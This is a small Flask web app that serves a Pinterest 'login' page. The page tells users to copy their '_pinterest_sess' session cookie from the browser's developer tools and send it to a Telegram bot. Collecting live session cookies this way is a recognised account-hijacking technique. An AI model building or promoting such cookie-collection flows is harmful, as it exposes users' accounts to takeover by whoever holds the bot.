from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/login")
def login():
    uid = request.args.get("uid", "unknown")
    return render_template_string("""
    <h2>📌 Pinterest Login</h2>
    <p>1. Open <a href="https://pinterest.com" target="_blank">pinterest.com</a> and login</p>
    <p>2. Open Developer Tools → Application → Cookies → Copy <b>_pinterest_sess</b> value</p>
    <p>3. Send this to bot via Telegram:</p>
    <pre>/setcookie &lt;your_cookie_here&gt;</pre>
    <hr><p>User ID: {{uid}}</p>
    """, uid=uid)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)
